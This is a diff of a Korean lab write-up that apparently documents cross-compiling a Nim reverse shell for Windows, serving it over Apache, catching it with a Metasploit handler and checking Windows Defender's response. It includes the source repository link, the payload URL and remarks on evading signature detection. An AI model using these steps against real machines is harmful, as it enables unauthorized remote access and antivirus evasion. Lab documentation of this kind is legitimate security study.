@@ -17,7 +17,7 @@ header:
 
 ---
 
-## 📌 실습 개요
+## 실습 개요
 
 Kali Linux에서 Nim으로 작성된 리버스 셸을 Windows x64 PE 파일로 크로스 컴파일하고, Windows 10 22H2 가상머신에서 실행시켜 Kali의 Handler로 원격 셸을 획득하는 과제다.
 
@@ -38,31 +38,9 @@ Kali Linux에서 Nim으로 작성된 리버스 셸을 Windows x64 PE 파일로 �
 
 ---
 
-## 🔧 전체 흐름
+## 전체 흐름
 
 ![소스 준비부터 결과 확인까지의 실습 흐름](/image/2026-10-11-windows10-defender-nim-reverse-shell/workflow-overview.png)
-
-```
-[Kali 192.168.64.2]
-    ↓
-1. Nim 리버스 셸 소스 다운로드
-    ↓
-2. 소스 내 LHOST / LPORT 수정
-    ↓
-3. nim.cfg 생성 (MinGW 크로스 컴파일러 지정)
-    ↓
-4. Windows용 .exe 빌드
-    ↓
-5. Apache 웹 서버에 .exe 파일 업로드
-    ↓
-6. Metasploit multi/handler 실행
-    ↓
-[Windows 10 192.168.64.6]
-    ↓
-7. 파일 다운로드 후 실행 → 셸 획득
-    ↓
-8. Windows 10 Defender 검사
-```
 
 ---
 
@@ -144,11 +122,6 @@ Hint: mm: orc; threads: on; opt: speed; options: -d:danger
 
 빌드 완료 후 `file` 명령으로 Windows x86-64용 PE32+ 실행 파일이 생성된 것을 확인했다.
 
-```
--rwxr-xr-x 1 root root 402762 Oct  5 20:27 rev_shell.exe
-rev_shell.exe: PE32+ executable for MS Windows 5.02 (GUI), x86-64, 18 sections
-```
-
 ![Windows x64용 PE 실행 파일 생성 확인](/image/2026-10-11-windows10-defender-nim-reverse-shell/build-result.png)
 
 ---
@@ -164,16 +137,6 @@ sudo systemctl start apache2
 ```
 
 **접근 URL**: `http://192.168.64.2/test/rev_shell.exe`
-
-```
-Index of /test
-
-Name                Last modified          Size
-Parent Directory
-rev_shell.exe       2026-10-05 20:31       393K
-
-Apache/2.4.68 (Debian) Server at 192.168.64.2 Port 80
-```
 
 ![격리된 Apache 서버에 배치된 Windows 실행 파일](/image/2026-10-11-windows10-defender-nim-reverse-shell/apache-transfer.png)
 
@@ -198,12 +161,7 @@ exploit -j
 [*] Exploit running as background job 0.
 ```
 
-| 소스 코드 | Handler |
-|---|---|
-| `v1` (Kali IP) | `LHOST` |
-| `v2` (포트) | `LPORT` |
-
-**⭐ 캡처 필수**: 리스너 시작 후 `sessions -l`로 **"No active sessions"** 상태를 기록해야 이후 세션 획득의 인과관계가 증명된다.
+소스 코드의 IP·포트와 Handler의 `LHOST`·`LPORT`가 일치해야 한다.
 
 ---
 
@@ -211,51 +169,9 @@ exploit -j
 
 **Windows 10** 에서 브라우저로 `http://192.168.64.2/test/rev_shell.exe`를 다운로드하고 **관리자 권한으로 실행**한다.
 
-### 7.1 Metasploit 콘솔 자동 출력
-
-```
-[*] Command shell session 1 opened 
-    (192.168.64.2:4444 -> 192.168.64.6:50049) 
-    at 2026-10-05 20:54:12 +0900
-```
-
-### 7.2 세션 목록 확인
-
-```
-msf6 > sessions -l
-
-Active sessions
-===============
-  Id  Name  Type             Information           Connection
-  --  ----  ----             -----------           ----------
-  1         shell x64/windows  Shell Banner:        192.168.64.2:4444 -> 
-                                C:\Users\user\         192.168.64.6:50049
-                                Downloads>
-```
-
-### 7.3 세션 진입 및 명령 실행
-
-```
-msf6 > sessions -i 1
-[*] Starting interaction with 1...
-
-Shell Banner:
-C:\Users\user\Downloads>
-
-C:\Users\user\Downloads> whoami
-windows-pm9lh6e\user
-
-C:\Users\user\Downloads> systeminfo
-```
+파일 실행 후 `Command shell session 1 opened`가 출력됐고, 세션 유형은 `shell x64/windows`로 표시됐다. 세션에 접속해 `whoami`와 `systeminfo`가 실행되는 것도 확인했다.
 
 ![Windows x64 command shell 세션 생성과 대상 계정 확인](/image/2026-10-11-windows10-defender-nim-reverse-shell/shell-session.png)
-
-**✅ 성공 검증**:
-- Windows에서 `rev_shell.exe` 실행 성공
-- Kali Handler로 역방향 연결 성공
-- `whoami` / `systeminfo` 원격 명령 실행 확인
-
----
 
 ## 8. Windows 10 Defender 검사
 
@@ -265,29 +181,18 @@ C:\Users\user\Downloads> systeminfo
 
 ![Windows Security 검사 결과 화면](/image/2026-10-11-windows10-defender-nim-reverse-shell/defender-scan-result.png)
 
-**검사 결과**:
-```
-현재 위협이 없습니다.
-마지막 검사: 2026-10-05 오후 9:20 (사용자 지정 검사)
-0개 위험이 있습니다.
-검사 지속 시간: 1 초
-0개 파일을 검사했습니다.
-```
-
-### ⭐ 동시 검증 (결정적 증거)
+### 확인 결과
 
 | 위치 | 상태 |
 |---|---|
-| **Kali** | ✅ 원격 셸 세션 **활성 상태** |
-| **Windows** | ✅ Defender 검사 **탐지 없음** |
+| **Kali** | 원격 셸 세션 활성 상태 |
+| **Windows** | 현재 위협 없음, 검사 파일 수 0개 |
 
-**→ Defender가 켜진 상태에서 Nim 리버스 셸로 우회 성공**
-
-> ⚠️ 다만 같은 화면에 `0개 파일을 검사했습니다`라고 기록되어 있어, 이 캡처만으로 해당 파일의 사용자 지정 검사 결과를 완전히 입증할 수는 없다.
+실행 파일과 원격 셸 동작은 확인했지만, Defender 화면에는 `0개 파일을 검사했습니다`라고 표시되어 있다. 따라서 이 캡처만으로 해당 파일의 사용자 지정 검사 결과까지 입증할 수는 없다.
 
 ---
 
-## 📊 최종 결과 요약
+## 최종 결과
 
 | 항목 | 결과 |
 |---|---|
@@ -296,7 +201,7 @@ C:\Users\user\Downloads> systeminfo
 | Kali Handler 연결 | ✅ 성공 |
 | 원격 command shell 획득 | ✅ 성공 |
 | `whoami` / `systeminfo` 원격 실행 | ✅ 성공 |
-| Defender 사용자 지정 검사 | ✅ 탐지 없음 |
+| Defender 화면 | 현재 위협 없음, 검사 파일 수 0개 |
 | 과제 보고서 제출 | ✅ 완료 |
 
 **정확히 무엇을 성공한 것인가**
@@ -321,20 +226,8 @@ Defender 탐지 여부는 Windows와 Defender 버전, 보안 인텔리전스, �
 
 Fiber 방식부터 Unified Remote까지 다 실패했는데, 이 과정에서 "파일 생성 → 전달 → 실행 → 연결 → 세션" 순서로 하나씩 체크하는 습관이 생겼다. **"안 된다"로 끝내지 않고 어느 단계에서 막혔는지 나누는 게** 결국 성공으로 이어졌다.
 
-### 시그니처와 행위 기반은 다르다
-
-Nim 페이로드가 통과된 건 **Defender DB에 그 시그니처가 없어서**지, 탐지 불가능이 아니었다. 같은 파일이라도 EDR이나 클라우드 보호가 켜져 있으면 결과가 달라질 수 있다.
-
-### 문서는 증거로 말해야 한다
-
-리스너 켠 직후 `sessions -l`로 "No active sessions"를 찍어둔 게, 나중에 세션 획득 인과관계를 설명할 때 가장 중요했다. **"했다"가 아니라 "이렇게 했다"를 증명해야** 했다.
-
 ---
 
 ## 참고
 
 - **Nim 리버스 셸 소스**: https://github.com/Sn1r/Nim-Reverse-Shell.git
-
----
-
-*본 글은 격리된 랩 환경에서 진행된 교육 목적의 실습 기록입니다. 모든 실습은 본인이 소유·통제하는 가상머신에서만 수행했습니다.*
